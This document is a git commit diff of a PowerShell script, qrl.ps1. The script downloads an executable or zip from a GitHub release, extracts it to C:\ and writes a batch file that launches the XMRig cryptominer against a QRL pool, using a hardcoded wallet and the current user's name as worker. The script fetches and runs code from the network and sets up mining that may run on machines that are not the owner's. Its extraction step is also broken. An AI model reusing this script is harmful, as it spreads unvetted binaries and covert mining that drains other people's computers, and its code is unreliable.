7c64917f2c701fd11139a1ebc435f7a71db455df
trangtrau <30510221+trangtrau@users.noreply.github.com>
2023-10-05 13:16:13 +0700

    Update qrl.ps1

--- qrl.ps1
+++ qrl.ps1
@@ -1,14 +1,16 @@
 $downloadPath = Join-Path -Path $env:USERPROFILE -ChildPath "Desktop"
-$url = "https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/QRL_VAN.exe"
-Invoke-WebRequest -Uri $url -OutFile "$downloadPath\QRL_VAN.exe"
-$packetCryptPath = Join-Path -Path $downloadPath -ChildPath "QRL_VAN.exe"
-Start-Process -FilePath $packetCryptPath
+$url = "https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/CSANGXMRIG.zip"
+Invoke-WebRequest -Uri $url -OutFile "$downloadPath\CSANGXMRIG.zip"
+
+$destinationPath = "C:\CSANGXMRIG" 
+Expand-Archive -Path $downloadPath -DestinationPath $destinationPath -Force
+
 Start-Sleep -Seconds 2
 
 Set-Location -Path "C:\AutoRclone-master"
 $userName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 $userName = $userName -replace "^.*\\", ""
-$folderPath = "C:\AutoRclone-master\"
+$folderPath = "C:\CSANGXMRIG\"
 $batContent = @"
 cd %~dp0
 xmrig.exe --donate-level 1 -o de.qrl.herominers.com:1166 -u Q01050060fadbd7c6007b985f0ab38b888069e663b5f708ebc2322a64571087eff6ad31a62ecd21 -p $userName -a rx/0 -k
